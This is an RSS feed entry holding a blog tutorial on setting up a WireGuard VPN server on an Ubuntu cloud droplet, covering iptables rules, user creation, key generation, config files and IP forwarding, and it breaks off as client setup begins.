<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[Thomas Laurenson]]></title><description><![CDATA[Personal portfolio and blog for Thomas Laurenson.]]></description><link>https://thomaslaurenson.com</link><generator>GatsbyJS</generator><lastBuildDate>Thu, 05 Aug 2021 21:45:05 GMT</lastBuildDate><item><title><![CDATA[Building a WireGuard VPN]]></title><description><![CDATA[Recently I had to set up a VPN for doing a pentest engagement. The main reason was I needed a static IP - something that I have to pay for…]]></description><link>https://thomaslaurenson.com/blog/2021-08-06/building-a-wireguard-vpn/</link><guid isPermaLink="false">https://thomaslaurenson.com/blog/2021-08-06/building-a-wireguard-vpn/</guid><pubDate>Fri, 06 Aug 2021 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Recently I had to set up a VPN for doing a pentest engagement. The main reason was I needed a static IP - something that I have to pay for from my lackluster ISP. Instead, I set up a WireGuard VPN on a cloud VPS - based on advice from a SysAdmin friend. This blog post documents my process on setting up WireGuard on a fresh Digital Ocean Droplet (VPS) and covers some things I didn’t find in some other tutorials.&lt;/p&gt;
&lt;p&gt;The main difference between other tutorials I read - I wanted a VPN for internet access only! I didn’t care about having a VPN to get a secure connection to an internal network - such as a cloud VPC. Read on if you want the same thing!&lt;/p&gt;
&lt;h2 id=&quot;contents&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#contents&quot; aria-label=&quot;contents permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Contents&lt;/h2&gt;
&lt;div class=&quot;table-of-contents&quot;&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#initial-vps-configuration&quot;&gt;Initial VPS Configuration&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#install-and-configure-wireguard-on-the-server&quot;&gt;Install and Configure Wireguard on the Server&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#generate-the-encryption-keys-for-the-server&quot;&gt;Generate the Encryption Keys for the Server&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#configure-wireguard-on-the-server&quot;&gt;Configure WireGuard on the Server&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#configure-firewall-rules&quot;&gt;Configure Firewall Rules&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#enable-ip-forwarding&quot;&gt;Enable IP Forwarding&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#install-and-configure-wireguard-on-the-client&quot;&gt;Install and Configure Wireguard on the Client&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#generate-the-encryption-keys-for-the-client&quot;&gt;Generate the Encryption Keys for the Client&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#configure-wireguard-on-the-client&quot;&gt;Configure WireGuard on the Client&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#back-to-the-server&quot;&gt;Back to the Server!&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#add-the-client-conf-to-the-vpn-server&quot;&gt;Add the Client Conf to the VPN Server&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#start-the-vpn-server&quot;&gt;Start the VPN Server&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#connect-to-the-vpn-server-from-the-client&quot;&gt;Connect to the VPN server from the Client!&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#troubleshooting&quot;&gt;Troubleshooting&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#conclusion&quot;&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;h2 id=&quot;initial-vps-configuration&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#initial-vps-configuration&quot; aria-label=&quot;initial vps configuration permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Initial VPS Configuration&lt;/h2&gt;
&lt;p&gt;I use Digital Ocean for VPS hosting. It is simple and cheap, and the pricing plans are no-nonsense. I picked a VPS, or what they call &lt;em&gt;Droplets&lt;/em&gt;, with the following configuration:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Image: Ubuntu 20.04 LTS x64&lt;/li&gt;
&lt;li&gt;Plan: Basic &gt; Regular Intel with SSD, $5 / month&lt;/li&gt;
&lt;li&gt;Datacenter: Choose the best option based on my location and target location&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;It makes sense to do an initial server configuration, mainly some hardening and security best practices. Digital Ocean recommends it, and so do I! There is even an &lt;a href=&quot;https://www.digitalocean.com/community/tutorials/initial-server-setup-with-ubuntu-20-04&quot;&gt;Initial Server Setup with Ubuntu 20.04&lt;/a&gt; provided by Digital Ocean. My usual setup is generally the same, with a couple of quirks.&lt;/p&gt;
&lt;p&gt;Start by logging in with &lt;code class=&quot;language-text&quot;&gt;root&lt;/code&gt; and providing the SSH key you used during Droplet creation.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;ssh -i ssh_key root@droplet_public_ip&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Firsts things first… do an update.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo apt update
sudo apt upgrade&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The next thing I do is set up an &lt;code class=&quot;language-text&quot;&gt;iptables&lt;/code&gt; firewall. Digital Ocean recommends using &lt;code class=&quot;language-text&quot;&gt;uwf&lt;/code&gt;. It might be good?! I have never used it. Anyway, I usually do a simple configuration to start with:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo iptables -A INPUT -m state --state INVALID -j DROP
sudo iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
sudo iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 22 -j ACCEPT
sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -P INPUT DROP&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The next step is to create a new user, so we can avoid using the &lt;code class=&quot;language-text&quot;&gt;root&lt;/code&gt; account. The commands listed below are a good solution. You can change the username &lt;code class=&quot;language-text&quot;&gt;thomas&lt;/code&gt; to match your own configuration.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo useradd -d /home/thomas -m -G sudo -s /bin/bash thomas
mkdir /home/thomas/.ssh
cp /root/.ssh/authorized_keys /home/thomas/.ssh/
chown -R thomas:thomas /home/thomas/.ssh
chmod 700 /home/thomas/.ssh
chmod 600 /home/thomas/.ssh/authorized_keys&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;As a summary:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Create a user called &lt;code class=&quot;language-text&quot;&gt;thomas&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Make a directory called &lt;code class=&quot;language-text&quot;&gt;.ssh&lt;/code&gt; in the new users home folder&lt;/li&gt;
&lt;li&gt;Copy the SSH key used during Droplet creation&lt;/li&gt;
&lt;li&gt;Change the ownership and permissions of the newly created SSH directories/files&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Quick caveat… you probably should have a different SSH key for the &lt;code class=&quot;language-text&quot;&gt;root&lt;/code&gt; and normal user account. That would be security best practices.&lt;/p&gt;
&lt;p&gt;Finally, create a password for the new account:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;passwd thomas&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And then exit the SSH session with the &lt;code class=&quot;language-text&quot;&gt;root&lt;/code&gt; user.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;exit&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And log back in using the new user account.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;ssh -i ssh_key thomas@droplet_public_ip&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&quot;install-and-configure-wireguard-on-the-server&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#install-and-configure-wireguard-on-the-server&quot; aria-label=&quot;install and configure wireguard on the server permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Install and Configure Wireguard on the Server&lt;/h2&gt;
&lt;p&gt;So far we have a new VPS, and did a basic setup. Now we will create the encryption keys and configuration file for the WireGuard VPN server. Start by installing the &lt;code class=&quot;language-text&quot;&gt;wireguard&lt;/code&gt; package:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo apt install wireguard&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;For the next few steps, we will switch to the &lt;code class=&quot;language-text&quot;&gt;root&lt;/code&gt; account. This makes life easier, as the WireGuard configuration requires &lt;code class=&quot;language-text&quot;&gt;root&lt;/code&gt; access for almost all commands.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo -i&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;generate-the-encryption-keys-for-the-server&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#generate-the-encryption-keys-for-the-server&quot; aria-label=&quot;generate the encryption keys for the server permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Generate the Encryption Keys for the Server&lt;/h3&gt;
&lt;p&gt;Start by creating some keys for the WireGuard server.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;cd /etc/wireguard/
umask 077; wg genkey | tee privatekey | wg pubkey &gt; publickey&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Verify the keys were created.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;cat privatekey
QNZqC+to/q+DQqJV3vDTRGRrO62GHkffRyuJFbtY91M=
cat publickey
6w9lu0iQu5pf2/vKnGzFJYoY3Ci2v3GNj3U6A3a2Gyg=&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;You will need these keys throughout the configuration so make sure you know where to find them. Make sure to keep these keys (especially the private key) safe and secure!&lt;/p&gt;
&lt;h3 id=&quot;configure-wireguard-on-the-server&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#configure-wireguard-on-the-server&quot; aria-label=&quot;configure wireguard on the server permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Configure WireGuard on the Server&lt;/h3&gt;
&lt;p&gt;You should still be in the same directory from the last section: &lt;code class=&quot;language-text&quot;&gt;/etc/wireguard&lt;/code&gt;. In this directory, we want to create a configuration file to store all the settings for our VPN server. Start by creating the configuration file.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;touch /etc/wireguard/wg0.conf&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And put in the following information. Note, you will need to change the &lt;code class=&quot;language-text&quot;&gt;PrivateKey&lt;/code&gt; value to the value of the &lt;code class=&quot;language-text&quot;&gt;privatekey&lt;/code&gt; that you created in the previous step. Also, note that there is a &lt;code class=&quot;language-text&quot;&gt;PLACEHOLDER&lt;/code&gt; value in the &lt;code class=&quot;language-text&quot;&gt;PublicKey&lt;/code&gt; for the “Peer” or client - we will replace this after configuring at least one client.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;[Interface]
Address = 10.0.0.1/24
ListenPort = 51820
PrivateKey = KFjLKgGlI43XzO74QccLvjkhxW4yFL/1eKro7p5ib2I=
PostUp = /etc/wireguard/up.sh
PostDown = /etc/wireguard/down.sh

[Peer]
PublicKey = 3tpwRGFdhPqDJdXufDSQCoDw8WoBHuaa7paoh/FeoF0=
AllowedIPs = 10.0.0.2/24&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Here is a brief description of these properties we are setting:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;Interface&lt;/code&gt;: Section for configuration of the server&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;Address&lt;/code&gt;: The IP address of the server in the VPN network&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;ListenPort&lt;/code&gt;: The port number WireGuard will run on&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;PrivateKey&lt;/code&gt;: The servers private key that we just generated&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;PostUp&lt;/code&gt;: Commands that will be run when the VPN server starts&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;PostDown&lt;/code&gt;: Commands that will be run when the VPN server stops&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;Peer&lt;/code&gt;: Section for configuration of clients&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;PublicKey&lt;/code&gt;: The public key of the client, which we have not yet created&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;AllowedIPs&lt;/code&gt;: The IP address of the client on the VPN network, which we will also configure on the client&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;configure-firewall-rules&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#configure-firewall-rules&quot; aria-label=&quot;configure firewall rules permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Configure Firewall Rules&lt;/h3&gt;
&lt;p&gt;In the &lt;code class=&quot;language-text&quot;&gt;wg0.conf&lt;/code&gt; file we had two scripts added, one for &lt;code class=&quot;language-text&quot;&gt;PostUp&lt;/code&gt; and one for &lt;code class=&quot;language-text&quot;&gt;PostDown&lt;/code&gt;. These scripts are run when the WireGuard VPN starts and stops. You can put anything in these scripts, but a common method is to include firewall rules to allow traffic in after starting the server, and remove those rules when the server is stopped.&lt;/p&gt;
&lt;p&gt;Start by creating the &lt;code class=&quot;language-text&quot;&gt;up.sh&lt;/code&gt; script.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;touch /etc/wireguard/up.sh&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And enter the following information.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;#!/bin/bash

iptables -A INPUT -i eth0 -p udp --dport 51820 -j ACCEPT
iptables -A INPUT -i wg0 -j ACCEPT
iptables -t nat -A POSTROUTING -s 10.0.0.0/24 -o eth0 -j MASQUERADE
iptables -A FORWARD -i wg0 -o eth0 -j ACCEPT
iptables -A FORWARD -i eth0 -o wg0 -j ACCEPT&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;As a quick summary, these rules will:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Allow incoming traffic on port &lt;code class=&quot;language-text&quot;&gt;51820&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Allow incoming traffic on the &lt;code class=&quot;language-text&quot;&gt;wg0&lt;/code&gt; interface&lt;/li&gt;
&lt;li&gt;Allow routed traffic out through &lt;code class=&quot;language-text&quot;&gt;eth0&lt;/code&gt; gets the server’s public IP (NAT)&lt;/li&gt;
&lt;li&gt;Allow traffic to be forwarded between &lt;code class=&quot;language-text&quot;&gt;eth0&lt;/code&gt; and &lt;code class=&quot;language-text&quot;&gt;wg0&lt;/code&gt; - in both directions&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Make sure the script is executable.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;chmod +x /etc/wireguard/up.sh&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now we will do the same for the &lt;code class=&quot;language-text&quot;&gt;PostDown&lt;/code&gt; script, called &lt;code class=&quot;language-text&quot;&gt;down.sh&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;touch /etc/wireguard/down.sh&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And enter the following information.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;#!/bin/bash

iptables -D INPUT -i eth0 -p udp --dport 51820 -j ACCEPT
iptables -D INPUT -i wg0 -j ACCEPT
iptables -t nat -D POSTROUTING -s 10.0.0.0/24 -o eth0 -j MASQUERADE
iptables -D FORWARD -i wg0 -o eth0 -j ACCEPT
iptables -D FORWARD -i eth0 -o wg0 -j ACCEPT&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;These are the same as the &lt;code class=&quot;language-text&quot;&gt;up.sh&lt;/code&gt; rules, apart from that we are removing all of them. Make sure the script is executable.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;chmod +x /etc/wireguard/down.sh&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;enable-ip-forwarding&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#enable-ip-forwarding&quot; aria-label=&quot;enable ip forwarding permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Enable IP Forwarding&lt;/h3&gt;
&lt;p&gt;The final step on the server is to allow IP forwarding.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;vim /etc/sysctl.conf&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Find the line with &lt;code class=&quot;language-text&quot;&gt;net.ipv4.ip_forward&lt;/code&gt; in it. It is set to a default of false - which is the value &lt;code class=&quot;language-text&quot;&gt;0&lt;/code&gt;. We need to set this to true - the value of &lt;code class=&quot;language-text&quot;&gt;1&lt;/code&gt;, to allow IPv4 traffic to be forwarded.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;net.ipv4.ip_forward=1&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Make sure the changes take effect by running the following command.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sysctl -p&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&quot;install-and-configure-wireguard-on-the-client&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#install-and-configure-wireguard-on-the-client&quot; aria-label=&quot;install and configure wireguard on the client permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Install and Configure Wireguard on the Client&lt;/h2&gt;
&lt;p&gt;In my scenario, I configured my VPN client to be a Kali Linux client - but WireGuard supports a variety of clients and some funky methods for easily adding new clients. Start by installing the WireGuard package on the client.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;sudo apt install wireguard&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Like the server configuration, we will switch to the &lt;code class=&quot;language-text&quot;&gt;root&lt;/code&gt; account. This makes life easier, as the WireGuard configuration requires &lt;code class=&quot;language-text&quot;&gt;root&lt;/code&gt; access for almost all commands.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo -i&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
